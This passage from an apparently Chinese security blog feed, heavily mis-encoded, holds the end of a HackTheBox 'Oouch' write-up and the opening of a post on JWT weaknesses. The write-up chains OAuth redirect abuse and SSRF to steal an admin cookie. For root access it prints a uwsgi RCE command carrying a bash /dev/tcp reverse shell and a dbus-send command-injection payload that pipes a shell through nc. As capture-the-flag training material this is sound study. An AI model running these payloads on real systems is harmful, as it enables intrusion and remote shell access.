æœã€‚ç¬¬äºŒä¸ªå‘ç°å­˜åœ¨<code>/application</code>ä¹Ÿå°±æ˜¯å¯ä»¥è®¿é—®<code>/oauth/application</code><br>ç„¶è€Œéœ€è¦ç”¨æˆ·å¯†ç ã€‚æˆ‘ä»¬ä¹‹å‰çš„è´¦æˆ·å¯†ç ä¹Ÿä¸è¡Œã€‚è¿™æ—¶ä»”ç»†è¿‡ä¸€édocument.å‘ç°è¯´è¿™ä¸ªè´¦æˆ·å¯†ç æ˜¯æœ‰æ³¨å†ŒåŠŸèƒ½çš„ï¼Œé‚£å°±è¯•è¯•<code>/oauth/application/register</code>å¹¶è¾“å…¥è´¦æˆ·å¯†ç </p><p><img src="/2020/07/01/hackthebox-Oouch/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆåŠŸäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±æœ‰äº†å¦ä¸€ä¸ªæœ‰æ•ˆçš„authorization appäº†ã€‚<br>æˆ‘è®¾ç½®çš„ä¿¡æ¯å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://authorization.oouch.htb:8000/oauth/applications/2/</span><br><span class="line"></span><br><span class="line">clientid cHYVFErrrGQAm6Q1iWEfgT0hgf2KX4SIecLnNCKg</span><br><span class="line">clientsecret 1QWQrnwCzUIiU8tB4BywB3p9Ca8umJGaSzoxJraanOwv7duBX3UnZN4n1VYMzLOrnrXh7OzLNhHF7qPv1UufuY8fIkNLDoPDSaUC2JGqKVeKb9oJZJweVHeFCgku6kqz</span><br><span class="line">Client <span class="built_in">type</span> public</span><br><span class="line">Authorization Grant Type client-credentials</span><br><span class="line">redirect uri  http://10.10.14.46/</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¹‹å‰çš„ssrfï¼Œæˆ‘ä»¬ä¼¼ä¹æœ‰åŠæ³•èƒ½å¤Ÿé€šè¿‡æœ€åçš„ä¸€ä¸ªuriå®Œæˆxssçš„æ”»å‡»ã€‚ä¹Ÿå°±æ˜¯æ‰“åˆ°adminçš„cookieã€‚é‚£ä¹ˆå¦‚ä½•åˆæ³•çš„æ„é€ ä¸€ä¸ªurlä½¿å¾—ç›´æ¥getè®¿é—®å°±èƒ½é‡å®šå‘å‘¢ï¼Ÿè¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€äº›oauthçš„çŸ¥è¯†<br><a href="https://developers.facebook.com/docs/instagram-basic-display-api/reference/oauth-authorize/" target="_blank" rel="noopener">oauth-authorize</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#facebook</span><br><span class="line">GET https:&#x2F;&#x2F;api.instagram.com&#x2F;oauth&#x2F;authorize</span><br><span class="line">  ?client_id&#x3D;&#123;app-id&#125;,</span><br><span class="line">  &amp;redirect_uri&#x3D;&#123;redirect-uri&#125;,</span><br><span class="line">  &amp;response_type&#x3D;code,</span><br><span class="line">  &amp;scope&#x3D;&#123;scope&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#twitter</span><br><span class="line">POST &#x2F;oauth2&#x2F;token HTTP&#x2F;1.1</span><br><span class="line">Host: api.twitter.com</span><br><span class="line">User-Agent: My Twitter App v1.0.23</span><br><span class="line">Authorization: Basic eHZ6MWV2R ... o4OERSZHlPZw&#x3D;&#x3D;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 29</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">grant_type&#x3D;client_credentials</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤ä¸ªåˆ†åˆ«æ˜¯facebookè·Ÿtwitterçš„oauthapiçš„å¼€å‘è€…æ–‡æ¡£é‡Œæ‰¾çš„ä¾‹å­ã€‚è™½ç„¶å„å®¶éƒ½æœ‰ä¸åŒï¼Œä½†æ˜¯å¤§æ¦‚çš„é‚£å‡ ä¸ªå‚æ•°ä¹Ÿæ˜¯èƒ½ç†è§£çš„ã€‚åŠ ä¸Šä¹‹å‰documenté‡Œè¯´<code>oauth/authorize</code>æ”¯æŒgetè¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¯ä»¥æŒ‰ç…§è‡ªå·±çš„appåŠŸèƒ½ï¼Œæ„é€ ä¸€ä¸ªæ¶æ„çš„urlï¼Œé‡å®šå‘åˆ°æˆ‘ä»¬è‡ªå·±è¿™ã€‚<br>å…ˆåƒself-xssä¸€æ ·å¾€è‡ªå·±è¿™æ‰“ä¸€å‘<br>urlçš„å„ä¸ªå‚æ•°éƒ½è¦ä¸ä¹‹å‰æ³¨å†Œçš„appçš„å€¼å®Œå…¨ä¸€è‡´ã€‚å…¶ä¸­response_typeä¸ºcodeæ˜¯oauthæ ‡å‡†å›ºå®šçš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;authorize&#x2F;?client_id&#x3D;cHYVFErrrGQAm6Q1iWEfgT0hgf2KX4SIecLnNCKg&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;10.10.14.46&#x2F;&amp;response_type&#x3D;code&amp;grant_type&#x3D;anthorization_code&amp;client_secret&#x3D;1QWQrnwCzUIiU8tB4BywB3p9Ca8umJGaSzoxJraanOwv7duBX3UnZN4n1VYMzLOrnrXh7OzLNhHF7qPv1UufuY8fIkNLDoPDSaUC2JGqKVeKb9oJZJweVHeFCgku6kqz</span><br></pre></td></tr></table></figure><p>ç›´æ¥æµè§ˆå™¨è®¿é—®è¿™ä¸ªurl,ä¼šè¿›å…¥åˆ°authorizeçš„ä¸­é—´å±‚ã€‚ç‚¹ä¸‹authorizeå°±èƒ½åœ¨æœ¬æœºæ”¶åˆ°è¯·æ±‚<br><img src="/2020/07/01/hackthebox-Oouch/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‚£ä¹ˆç›´æ¥åˆ©ç”¨ä¹‹å‰çš„<code>contact</code>å¤„ssrfå³å¯å®Œæˆcookieçš„ç›—å–ã€‚</p><p><img src="/2020/07/01/hackthebox-Oouch/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™é‡Œæ¯”è¾ƒç‹—çš„æ˜¯å¿…é¡»å»æ‰<code>response_type</code>è¿™ä¸ªè¯·æ±‚å‚æ•°ï¼Œæ‰èƒ½å®Œæˆé‡å®šå‘ã€‚åŸç†å…¶å®ä¸Šé¢è§£é‡Šè¿‡äº†ï¼Œå› ä¸ºä¸€ä¸ªæœ‰æ•ˆçš„è¯·æ±‚å¿…é¡»ç»è¿‡æ‰‹åŠ¨çš„authorizationç¡®è®¤æ‰èƒ½å®Œæˆé‡å®šå‘ã€‚å¦‚æœæ˜¯ä¸€ä¸ªä¸æœ‰æ•ˆçš„urlåˆ™ä¼šåœ¨æˆæƒä¹‹å‰å°±é‡å®šå‘ã€‚åŸºäºæ­¤å¤„åªèƒ½å‘ä¸€ä¸ªè¯·æ±‚ã€‚æˆ‘ä»¬åªèƒ½é€šè¿‡ä¸€ä¸ªæ— æ•ˆresponse_typeå®Œæˆé‡å®šå‘ã€‚</p><p><img src="/2020/07/01/hackthebox-Oouch/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¾—åˆ°cookieåæ›´æ¢ã€‚æ¥ä¸‹æ¥å°è¯•è®¿é—®<code>oauth/token</code></p><p><a href="https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/" target="_blank" rel="noopener">https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/</a><br>ä¸Šé¢æ˜¯oauthå®˜æ–¹æ–‡æ¡£çš„ï¼Œé€šè¿‡oauth/tokenè·å–ä¸€ä¸ªaccess_tokenå†…å®¹ã€‚æˆ‘ä»¬å‚ç…§æ ¼å¼å‘åŒ…å³å¯(æ³¨æ„è¿™é‡Œgrant_typeçš„å€¼ä¸æˆ‘ä»¬åˆå§‹çš„appä¸ä¸€æ ·ã€‚æ‰€ä»¥è¦ç”¨ä¹‹å‰çš„è´¦æˆ·æ›´æ”¹è¿™ä¸€é€‰é¡¹)<br><img src="/2020/07/01/hackthebox-Oouch/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥ç”¨å¾—åˆ°çš„access_token è®¿é—®å”¯ä¸€æ²¡ç”¨ä¸Šçš„/api/get_user?access_token=xxxx.<br>å‘ç°è¿”å›userçš„jsonä¿¡æ¯ã€‚ç„¶åå°±å¡ä½äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚è¿™æ—¶æƒ³èµ·æ¥å‰é¢è¿˜æç¤ºè¯´æœ‰è·å–sshkeyçš„æ–¹æ³•ã€‚äºæ˜¯æŠŠuseræ¢æˆssh</p><p><img src="/2020/07/01/hackthebox-Oouch/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‹¿åˆ°keyåç»ˆäºå¯ä»¥ç™»é™†è¿™å°é¶æœºæ‹¿åˆ°user.txtäº†ã€‚</p><p>å°ç»“ä¸‹ã€‚ç¬¬ä¸€éƒ¨åˆ†ææ€•éš¾åº¦æ¯”å¸¸è§„çš„htbwebéƒ¨åˆ†è¦éš¾çš„å¤šã€‚å› ä¸ºæ¶‰åŠäº†å¤§é‡æ–°çŸ¥è¯†ä»¥åŠæƒé™é—®é¢˜ï¼ŒåŒæ—¶ç½‘ç«™ä¸çŸ¥é“ä¸ºä»€ä¹ˆç»å¸¸500ã€‚ä¸è¿‡oauthçš„å­˜åœ¨ä¹Ÿè®©æˆ‘é‡æ–°ä½“ä¼šåˆ°äº†è¶Šæƒçš„è®¸å¤šæ–°å¯èƒ½ã€‚æœ€åçš„sshæ€»è§‰å¾—æœ‰ç‚¹è„‘æ´äº†ã€‚</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>sshç™»å½•åå…ˆçœ‹åˆ°ç›®å½•ä¸‹æœ‰ä¸ªæç¤º.note.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Implementing an IPS using DBus and iptables &#x3D;&#x3D; Genius?</span><br></pre></td></tr></table></figure><p>Dbusä¼¼ä¹æ˜¯çªç ´å£ã€‚ä½†æ˜¯æˆ‘çš„äº†è§£ä»…é™äºçŸ¥é“Dbusæ˜¯å·¥æ§é‡Œç»å¸¸å‡ºç°çš„åè®®ã€‚<br>ç„¶ålinpeas.shæ‰«ä¸€éã€‚å‘ç°æ²¡æœ‰ä»€ä¹ˆæœ‰æ„æ€çš„æ–‡ä»¶ã€‚å› ä¸ºä¸¤ä¸ªpythonæœåŠ¡éƒ½æ˜¯ç”¨dockerè·‘çš„ã€‚<br>åŒæ—¶www-dataè·‘ç€uwsgi.<br><img src="/2020/07/01/hackthebox-Oouch/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œé¦–å…ˆé—®é¢˜æ˜¯æˆ‘ä»¬ä½œä¸ºérootç”¨æˆ·å¦‚ä½•è¿›å…¥dockerã€‚ä¸ç„¶æœ‰æ•ˆä¿¡æ¯å®åœ¨å¤ªå°‘äº†ã€‚è¯•äº†å¾ˆä¹…å‘ç°å¯ä»¥ç›´æ¥ç”¨sshç™»å½•è¿›docker???</p><p>å½“ç„¶ã€‚åªæœ‰Flaskçš„dockeræ˜¯å¯ä»¥ç”¨sshç™»å½•çš„ã€‚ç™»å½•è¿›å»åå…ˆçœ‹æ–‡ä»¶æºç ã€‚åœ¨å…¶ä¸­ä¸€ä¸ªæ‰¾åˆ°<br><img src="/2020/07/01/hackthebox-Oouch/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‡Œé¢æåˆ°äº†Dbusçš„interfaceä¹Ÿå°±æ˜¯æ¥å£ã€‚åç§°å«åš<code>htb.oouch.Blcok</code>ã€‚å¹¶ä¸”åé¢è°ƒç”¨äº†Blockæ–¹æ³•ã€‚</p><p>å¦ä¸€è¾¹åœ¨oouchæœ¬æœºä¸Šæ‰¾dbusç›¸å…³é…ç½®ã€‚åœ¨<code>/etc/dbus-1/system.d</code>å‘ç°configæ–‡ä»¶<br><img src="/2020/07/01/hackthebox-Oouch/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="comment">&lt;!-- -*- XML -*- --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">busconfig</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">busconfig</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">policy</span> <span class="attr">user</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">allow</span> <span class="attr">own</span>=<span class="string">"htb.oouch.Block"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">policy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">policy</span> <span class="attr">user</span>=<span class="string">"www-data"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">allow</span> <span class="attr">send_destination</span>=<span class="string">"htb.oouch.Block"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">allow</span> <span class="attr">receive_sender</span>=<span class="string">"htb.oouch.Block"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">policy</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">busconfig</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œrootç¡®å®æ˜¯å¯ä»¥åˆ©ç”¨dbusè¿›è¡Œé€šä¿¡çš„ã€‚ä½†åªæœ‰www-dataå¯ä»¥è¿›è¡Œæ”¶å‘æ¶ˆæ¯é€šä¿¡ã€‚é‚£ä¹ˆä¸‹é¢çš„è¦åŠ¡æ˜¯è·å–www-dataçš„æƒé™ã€‚</p><p>è¿™é‡Œå…¶å®å¹¶ä¸éš¾ã€‚å› ä¸ºæˆ‘ä»¬ä¹‹å‰å·²ç»å‘ç°è¿‡ï¼Œwww-dataæ˜¯è·‘ç€uwsgiçš„ã€‚è€Œpythonçš„uwsgiå¯ä»¥è§¦å‘RCEä¼¼ä¹åœ¨å‡ å¹´å‰çš„RWCTFä¸­å°±å‡ºç°è¿‡ã€‚(è¿™æ˜¯çœ‹CTF is awesome ä¸­å¬åˆ°youtuberæåˆ°çš„) </p><p>æ‰€ä»¥ä¸»è¦å°±éº»çƒ¦åœ¨æŠŠexpä¼ è¿‡å»ã€‚è¿™é‡Œä½¿ç”¨scpæ¯”è¾ƒæ–¹ä¾¿ã€‚å› ä¸ºdockerå®¹å™¨é‡Œå•¥éƒ½æ²¡æœ‰.<br>æ£€æŸ¥ä¸‹socketæ–‡ä»¶ä½ç½®ï¼Œäºæ˜¯åœ¨dockerçš„webæºç å¤„æ‰¾åˆ°uwsgi.iniæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/code$ cat uwsgi.ini </span><br><span class="line">[uwsgi]</span><br><span class="line">module = oouch:app</span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">master = <span class="literal">true</span></span><br><span class="line">processes = 10</span><br><span class="line">socket = /tmp/uwsgi.socket</span><br><span class="line">chmod-sock = 777</span><br><span class="line">vacuum = <span class="literal">true</span></span><br><span class="line">die-on-term = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py" target="_blank" rel="noopener">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</a><br>uwsgiçš„è„šæœ¬ä¼ å¥½<br>è¿è¡Œè„šæœ¬ï¼Œæ¥ä¸‹æ¥qtcå¤„ncæ¥å—å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rce.py  -m unix -u &#x2F;tmp&#x2F;uwsgi.socket -c &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.18.0.1&#x2F;9001 0&gt;&amp;1&#39;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/hackthebox-Oouch/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œä¼¼ä¹è„šæœ¬æœ‰ä¸ªå°é—®é¢˜ï¼Œä¸è¿‡æŠŠæŠ¥é”™çš„ä½ç½®æ”¹ä¸‹å°±å¥½ã€‚</p><p>ç„¶åæœ¬æ¥åº”è¯¥å¾ˆå¿«è§£å†³çš„www-dataè·Ÿrooté€šä¿¡é—®é¢˜å›°æ‰°äº†æˆ‘å¥½ä¹…ã€‚é¦–å…ˆä¼ ä¸€ä¸ªncåˆ°dockeré‡Œé¢ç›‘å¬ï¼Œç„¶åç”¨åˆšåˆšdockerçš„www-dataçš„shellä¼ ä¸‹é¢è¿™ä¸ªpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbus-send --system  --print-reply --dest&#x3D;htb.oouch.Block  htb&#x2F;oouch&#x2F;Block  htb.oouch.Block.Block &quot;string:; rm &#x2F;tmp&#x2F;f ; mkfifo &#x2F;tmp&#x2F;f; cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc 172.18.0.3 6666 &gt;&#x2F;tmp&#x2F;f;&quot;</span><br></pre></td></tr></table></figure><p>æŒ‰ç†è¯´åº”è¯¥æˆçš„ï¼Œç»“æœå¡äº†å¥½ä¹…ã€‚ä¸ºæ­¤ç‰¹æ„ä¸Šç½‘æ‰¾wpç»“æœå‘ç°æ˜¯å‡ ä¹ä¸€æ ·çš„payloadã€‚åŠ ä¸Šæˆ‘åˆä¸æ‡‚dbusï¼Œæ‰€ä»¥å°±åªå¥½æç½®äº†ã€‚ç»“æœç¬¬äºŒå¤©å†è¯•äº†ä¸‹å°±æˆäº†â€¦â€¦ä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºæˆ‘ä¼ äº†ä¸ªoouchè‡ªå·±çš„ncåˆ°dockeré‡Œé¢çš„ç¼˜æ•…ã€‚æ€»ä¹‹å¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥ä¸æƒ³å†å¤ç°äº†ã€‚<br><img src="/2020/07/01/hackthebox-Oouch/15.PNG" class="lazyload" data-srcset="15.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>è¿™å°é¶æœºä¸»è¦ä»·å€¼åœ¨äºå‰é¢get useréƒ¨åˆ†éå¸¸è´´è¿‘å®æˆ˜ã€‚æˆ‘è§‰å¾—æ˜¯æœ‰å¾ˆé«˜å­¦ä¹ ä»·å€¼çš„ã€‚å…³äºoauthçš„çŸ¥è¯†ä¹‹åæœ€å¥½å»äº†è§£ä¸‹ï¼Œå¯¹æˆæƒè¿™å—æœ¬åº”è¯¥å±äºé‡ç‚¹çš„å®‰å…¨é—®é¢˜èƒ½æœ‰æ–°çš„è®¤è¯†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Make jwt great again</title>
      <link href="2020/06/24/Make-jwt-great-again/"/>
      <url>2020/06/24/Make-jwt-great-again/</url>
      
        <content type="html"><![CDATA[<p>jwtï¼Œå…¨ç§°json-web-token.å…¶å®‰å…¨é—®é¢˜ä¸€ç›´ä»¥æ¥ä¼—æ‰€å‘¨çŸ¥ã€‚CTFä¸­ä¹Ÿç»å¸¸æ€§çš„ä¼šå‡ºç°ç›¸å…³çš„jwtä¼ªé€ çš„é¢˜ç›®ã€‚ä½†æ˜¯ä¹‹å‰åœ¨æ‰“äº†åœºNahamconCTFçš„æ¯”èµ›åï¼Œå¯¹jwtåˆæœ‰äº†å…¨æ–°çš„è®¤è¯†ã€‚å› æ­¤åœ¨è¿™é‡Œå…¨é¢çš„è§£é‡Šä¸‹jwtçš„ç›¸å…³æ¼æ´ã€‚Letâ€™s make jwt great again :)</p><a id="more"></a><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><blockquote><p>JWTçš„å…¨ç§° Json Web Tokenã€‚å®ƒéµå¾ªJSONæ ¼å¼ï¼Œå°†ç”¨æˆ·ä¿¡æ¯åŠ å¯†åˆ°tokené‡Œï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜ä»»ä½•ç”¨æˆ·ä¿¡æ¯ï¼Œåªä¿å­˜å¯†é’¥ä¿¡æ¯ï¼Œé€šè¿‡ä½¿ç”¨ç‰¹å®šåŠ å¯†ç®—æ³•éªŒè¯tokenï¼Œé€šè¿‡tokenéªŒè¯ç”¨æˆ·èº«ä»½ã€‚åŸºäºtokençš„èº«ä»½éªŒè¯å¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„cookie+sessionèº«ä»½éªŒè¯æ–¹æ³•</p></blockquote><p>å…¶æ ¼å¼ä¹Ÿéå¸¸æ¸…æ™°<br><code>header.payload.signature</code><br>ç”±ä¸‰æ®µå¼ç»„æˆã€‚</p><p>è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œflaskçš„sessionç”Ÿæˆæ ¼å¼ä¹ŸåŒæ ·æ˜¯ä¸‰æ®µå¼ã€‚æœ‰ä¸€å®šçš„å¼‚æ›²åŒå·¥ä¹‹å¤„ã€‚ä½†æ˜¯ä¸åŒäºjwtã€‚å…¶ä¼ªé€ æ–¹å¼å¾€å¾€éå¸¸å±€é™ã€‚</p><p>ä¸‹é¢ç®€å•è°ˆä¸‹ä¸‰ä¸ªéƒ¨åˆ†ç»“æ„</p><ul><li>header<br>ä¸€ä¸ªç®€å•çš„headeræ˜¯è¿™ç§å½¢å¼çš„<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">"alg"</span> : <span class="string">"HS256"</span>,</span><br><span class="line">        <span class="attr">"typ"</span> : <span class="string">"jwt"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>ä½†æ˜¯å®é™…ä¸Šjwtçš„headerè¿˜æ”¯æŒåŠ å…¥å…¶å®ƒå‡ ä¸ªå±æ€§ã€‚<br><code>kid,jwk......</code><br>å…¶å…·ä½“å«ä¹‰å°†åœ¨åé¢æåŠã€‚</p><ul><li>payload<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"user_role"</span> : <span class="string">"finn"</span>,    <span class="comment">//å½“å‰ç™»å½•ç”¨æˆ·</span></span><br><span class="line">    <span class="attr">"iss"</span>: <span class="string">"admin"</span>,          <span class="comment">//è¯¥JWTçš„ç­¾å‘è€…</span></span><br><span class="line">    <span class="attr">"iat"</span>: <span class="number">1573440582</span>,        <span 